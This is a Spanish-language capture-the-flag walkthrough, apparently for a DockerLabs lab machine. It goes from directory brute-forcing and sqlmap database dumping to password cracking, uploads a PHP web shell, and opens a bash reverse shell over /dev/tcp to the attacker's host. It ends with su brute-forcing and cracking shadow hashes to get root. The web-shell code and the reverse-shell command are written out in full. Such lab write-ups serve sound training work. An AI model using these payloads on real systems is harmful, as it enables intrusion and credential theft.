nmap: 80

![image](https://github.com/user-attachments/assets/2ff1e276-c37b-4d4a-8b9f-14d603d06229)


---
entramos a la pagina principal y la verdad no hay mucho, tampoco en el código fuente

![image](https://github.com/user-attachments/assets/d055eff7-403d-4808-8008-e98742cc9f3c)

hacemos un gobuster:
> gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64 -x php,html,py,txt

nos da un login.php
![image](https://github.com/user-attachments/assets/44e2f0c3-bf79-4eac-9182-06d47ccae654)

![image](https://github.com/user-attachments/assets/dba385cc-25fd-47ed-8789-fb7a1b457b55)


dentro en el buscador colocamos 

    'or 1=1-- -' 

Esto es una inyección SQL que explota vulnerabilidades en consultas a bases de datos como por ejemplo ese login 

Puntos importantes de esa explotación:
> Funciona cuando el sistema no valida correctamente las entradas de usuario
> la base de datos soporta comentarios (--) para ignorar el resto de la consulta

y no funciona cuando:
> hay validación o escape de caracteres en las entradas 
> y el motor de la base de datos no interpreta (--) como comentario.

como en ese login no permite esa inyección probamos creando un usuario y contraseña e ingresamos, lo que logramos es entrar a la pagina de esta forma:
![image](https://github.com/user-attachments/assets/7ef3f704-d534-4c2f-9331-bbeffbfb11e3)

voy a probar con burpsuite desde donde dice "comprar ahora", capturamos y hacemos una consulta sqlmap con el request que capturamos
![image](https://github.com/user-attachments/assets/1a34f523-8919-41b2-bd7e-7af4cda97399)

ahí se guardo la petición y así que hacemos un sqlmap

    sqlmap -r  request --batch --dump


y nos dio:
![image](https://github.com/user-attachments/assets/13406494-f292-40af-aac2-0c5114932387)

creamos un hash con nano, pegamos la contraseña que nos dio el sqlmap
crackeamos la contraseña con john:

    john --wordlist=/usr/share/wordlists/rockyou.txt hash
 
 me da la contraseña del admin
![image](https://github.com/user-attachments/assets/61bfdc72-9ddf-4c67-b2ce-ef75e2229252)

cerramos sesión e ingresamos con la sesión de admin
al final podemos ver un panel de administración 
vamos a configuraciones > subir archivos.

creamos un phtml ya que con php no sirve y lo buscamos en: https://book.hacktricks.xyz/pentesting-web/file-upload
![image](https://github.com/user-attachments/assets/dbdd29ef-b39f-4204-8cab-cb6743b931fb)


creamos un php dentro permite la ejecución remota de comandos sin validación

     - <?php
       system($_GET['cmd']);
       ?>

lo subimos:
![image](https://github.com/user-attachments/assets/114eb20f-49a2-41da-972e-0dcc6c9736cb)


después de subir el archivo vamos a uploads  y vemos que esta ahí, comprobamos
![image](https://github.com/user-attachments/assets/4838956b-d829-4f38-9ccf-d648e30600fe)


ahora colocamos una bash

    http://172.17.0.2/uploads/shell.phtml?cmd=bash -c 'bash -i >%26   /dev/tcp/172.17.0.1/443 0>%261'
    
mientras la terminal nuestra esta en escucha y tenemos conexión 
![image](https://github.com/user-attachments/assets/c912d156-c0ec-4817-bc93-2bcdda680262)

entramos y ahora escalamos.

encontré que para escalar se utiliza "su-bruteforce" , buscamos alguna forma y encontré:
https://github.com/d4t4s3c/suForce
utilizamos este diccionario: https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/techyou.txt
![image](https://github.com/user-attachments/assets/1ae3b8e7-bd61-4ef4-8e9a-b3002a5a56ed)


nos pasamos el suforce y techyou.txt por wget abriendo un servidor en nuestro terminal con python3.
pasamos dos diccionarios por si acaso, ahora iniciamos la fuerza bruta
después de un rato nos da la contraseña de luis
![[contraseña1.png]]
nos pasamos al otro usuario

muestra que para escalar a root esta el grupo "shadow" que se vio con el id
![[shadows.png]]
buscando encontré una posible contraseña:
![[paso1.png]]
dejamos un txt así: cosa que podamos sacar  la contraseña 
![[paso2.png]]
de la mejor forma es hacer el ataque en nuestra  terminal con el comando:

        john --wordlist=/usr/share/wordlists/rockyou.txt shadows.txt

y nos da la contraseña: rainbow2

su root / rainbow2
![[dockerlabs/medio/apolos/root.png]]
y somos root!
